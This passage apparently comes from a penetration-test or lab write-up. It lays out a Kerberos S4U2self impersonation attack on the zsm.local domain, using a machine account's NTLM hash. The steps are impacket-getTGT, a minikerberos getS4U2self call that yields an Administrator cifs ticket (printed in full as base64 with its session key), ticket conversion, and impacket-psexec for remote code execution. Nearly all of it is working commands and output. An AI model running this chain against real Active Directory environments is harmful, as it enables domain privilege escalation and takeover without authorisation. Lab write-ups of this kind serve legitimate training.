
This uses the Machine Account's TGT from our ccache to request a service ticket for the cifs service which impersonates the Administrator and saves this service ticket to Administrator.ccache. Which we can use to authenticate via Kerberos!

1. Request TGT

```
impacket-getTGT zsm.local/ZPH-SVRMGMT1$ -hashes :89d0b56874f61ad38bad336a77b8ef2f
```

2. Impersonated & requested Administrator TGT.

```
minikerberos-getS4U2self kerberos+ccache://zsm.local\\ZPH-SVRMGMT1\$:'ZPH-SVRMGMT1$.ccache'@192.168.210.10 cifs/ZPH-SVRMGMT1.zsm.local@192.168.210.10 Administrator@zsm.local --ccache Administrator.ccache
Ticket stored in ccache file Administrator.ccache

Realm        : ZSM.LOCAL
Sname        : cifs/ZPH-SVRMGMT1.zsm.local
UserName     : Administrator
UserRealm    : zsm.local
StartTime    : 2026-08-01 22:38:46+00:00
EndTime      : 2026-08-02 08:19:09+00:00
RenewTill    : 2026-08-02 22:19:05+00:00
Flags        : forwardable, pre-authent, renewable, enc-pa-rep
Keytype      : 23
Key          : ow5XFoOHjk54w89GdMRdHg==
EncodedKirbi : 

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
```

3. Stored kirbi in Administrator.kirbi

4. Converted kirbi into .ccache format (for linux)

```
impacket-ticketConverter Administrator.kirbi Administrator.ccache
```

5. Export Ticket

```
export KRB5CCNAME=Administrator.ccache
```

5. Connect to target

WARNING: When connecting it's important that we utilize the cifs not the target ip address **cifs/ZPH-SVRMGMT1.zsm.local** of the s4u2self output.

```
impacket-psexec -k -no-pass zsm.local/Administrator@ZPH-SVRMGMT1.ZSM.LOCAL -target-ip 192.168.210.11
```